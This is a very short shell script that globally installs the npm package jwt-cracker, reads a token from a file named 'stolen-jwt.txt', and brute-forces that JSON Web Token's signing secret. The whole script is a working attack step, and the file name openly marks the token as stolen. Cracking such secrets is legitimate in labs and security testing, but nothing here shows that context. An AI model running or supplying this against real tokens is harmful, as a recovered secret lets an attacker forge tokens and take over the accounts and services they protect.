#!/bin/sh
npm i -g jwt-cracker
token=`cat stolen-jwt.txt`
jwt-cracker $token 